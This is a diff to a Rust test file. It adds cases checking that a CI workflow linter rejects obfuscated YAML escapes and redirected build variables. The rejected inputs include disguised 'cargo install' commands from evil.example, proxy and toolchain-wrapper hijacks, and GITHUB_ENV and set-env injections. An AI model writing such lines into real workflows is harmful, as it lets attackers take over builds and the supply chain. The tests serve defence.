@@ -492,6 +492,34 @@ fn the_template_is_read_in_every_branch() {
     }
 }
 
+/// R1 (round 6): a YAML escape in a double-quoted scalar spells text the
+/// text rules never read (`"c\x61rgo install"` is `cargo install`), so no
+/// double-quoted scalar, key or value, holds a backslash.
+#[test]
+fn the_yaml_subset_refuses_escapes_in_double_quoted_values() {
+    for rejected in [
+        "steps:\n  - run: \"c\\x61rgo install evil-tool --git https://evil.example/x\"\n",
+        "steps:\n  - run: \"echo CARGO_\\x48OME=/tmp/h >> $GITHUB_\\x45NV\"\n",
+        "steps: [{run: \"c\\u0061rgo install x\"}]\n",
+        "env:\n  A: \"\\\"quoted\\\"\"\n",
+        "\"u\\x73es\": evil/act@main\n",
+    ] {
+        assert!(
+            !yaml_subset_violations("t.yml", rejected).is_empty(),
+            "accepted: {rejected}"
+        );
+    }
+    for accepted in [
+        // Plain and single-quoted scalars and block text have no escapes.
+        "steps:\n  - run: scripts/fuzz.sh -r \"^${TARGET}\\$\"\n",
+        "steps:\n  - run: 'echo \\x61'\n",
+        "steps:\n  - run: |\n      printf \"a\\n\"\n",
+        "env:\n  A: \"no escape\"\n",
+    ] {
+        assert_clean(&yaml_subset_violations("t.yml", accepted));
+    }
+}
+
 /// F4: a reader that takes a key's first value and one that takes its last
 /// would disagree, so no mapping repeats a key, in any case.
 #[test]
@@ -547,6 +575,30 @@ fn the_environment_rule_rejects_redirecting_variables() {
         "steps:\n  - run: echo \"CARGO_REGISTRIES_X_INDEX=https://evil.example\" >> \"$GITHUB_ENV\"\n",
         "steps:\n  - run: echo \"A=b\" >> $GITHUB_ENV\n",
         "steps:\n  - run: |\n      printf '%s\\n' \"X=1\" >> \"${GITHUB_ENV}\"\n",
+        // Round 6: HTTP settings, the dist root, compiler wrappers, build and
+        // target settings, the configuration directory, HOME and RUSTC set
+        // (not read), cargo configuration files and flags, and the
+        // deprecated workflow commands with their switch.
+        "env:\n  CARGO_HTTP_PROXY: http://evil.example:3128\n",
+        "env:\n  CARGO_HTTP_CAINFO: /tmp/evil-ca.pem\n",
+        "env:\n  RUSTUP_DIST_ROOT: https://evil.example/dist\n",
+        "env:\n  RUSTC_WRAPPER: /tmp/wrap\n",
+        "env:\n  RUSTC_WORKSPACE_WRAPPER: /tmp/wrap\n",
+        "env:\n  CARGO_BUILD_RUSTC_WRAPPER: /tmp/wrap\n",
+        "env:\n  CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER: /tmp/run\n",
+        "env:\n  XDG_CONFIG_HOME: /tmp/ci\n",
+        "env:\n  HOME: /tmp/ci\n",
+        "env: {\"HOME\": /tmp/ci}\n",
+        "env:\n  RUSTC: /tmp/rustc\n",
+        "steps:\n  - run: HOME=\"$PWD/.ci\" cargo build\n",
+        "steps:\n  - run: env RUSTC=/tmp/rustc cargo build\n",
+        "steps:\n  - run: cp ci/config.toml .cargo/config.toml\n",
+        "steps:\n  - run: mkdir -p x/cargo && cp c x/cargo/config\n",
+        "steps:\n  - run: cargo build --config 'source.crates-io.replace-with=\"m\"'\n",
+        "steps:\n  - run: cargo build --config=net.offline=true\n",
+        "env:\n  ACTIONS_ALLOW_UNSECURE_COMMANDS: \"true\"\n",
+        "steps:\n  - run: echo \"::set-env name=CARGO_X::y\"\n",
+        "steps:\n  - run: echo '::add-path::/tmp/bin'\n",
     ] {
         let text = snippet(rejected);
         assert!(
@@ -558,6 +610,8 @@ fn the_environment_rule_rejects_redirecting_variables() {
         "env:\n  CARGO_TERM_COLOR: always\n  RUSTFLAGS: -D warnings\n",
         "env:\n  FORGE_CARGO_HOMEPAGE: x\n",
         "steps:\n  - run: echo \"$HOME/bin\" >> \"$GITHUB_PATH\"\n",
+        "steps:\n  - run: rustc --version && ls \"${HOME}\" ~/.cargo/bin\n",
+        "steps:\n  - run: cargo install tool --root \"$HOME/.forge-tools\"\n",
     ] {
         assert_clean(&environment_violations("t.yml", &snippet(accepted)));
     }
